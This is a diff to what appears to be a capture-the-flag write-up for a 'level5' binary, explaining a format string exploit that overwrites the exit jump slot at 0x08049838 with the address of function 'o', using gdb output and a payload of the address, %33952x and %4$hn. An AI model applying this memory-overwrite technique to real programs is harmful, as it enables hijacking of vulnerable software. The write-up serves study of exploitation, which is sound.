@@ -16,16 +16,19 @@ solution level5:
 
 -> we need to find a way to call "o", and we know that we can exploit the printf method to modify the memory of our program
 
--> since the next and only instruction after printf is the call to exit, we are going to make that instruction call function "o" instead:
+-> the next and only instruction after printf is the call to exit
 > (gdb) disass exit
 Dump of assembler code for function exit@plt:
    0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
 ...
-The exit method makes a jump to address 0x08049838; this will be the address to replace.
-The address of function "o" is 0x080484a4. Therefore we need to replace the last 2 bytes by 84a4, which is 33956 in decimal.
+The exit method makes a jump to the instruction stored at address 0x08049838;
+> (gdb) x/x 0x8049838
+0x080483d6
+0x080483d6 will be the address to replace.
+The address of function "o" is 0x080484a4. The first 2 bytes being equal, we only need to replace the last 2 bytes by 84a4, which is 33956 in decimal.
 
 -> our buffer will contain:
-- the address to replace -> \x38\x98\x04\x08
+- the address of the memory we want to change -> \x38\x98\x04\x08
 - our number minus the size of the address above : 33956 - 4 = 33952 -> %33952x
 - the %n modifier, but only half of the address needs to be changed, so we'll use the size specifier 'h'. We also need to indicate the argument index, which is 4 -> %4$hn
 
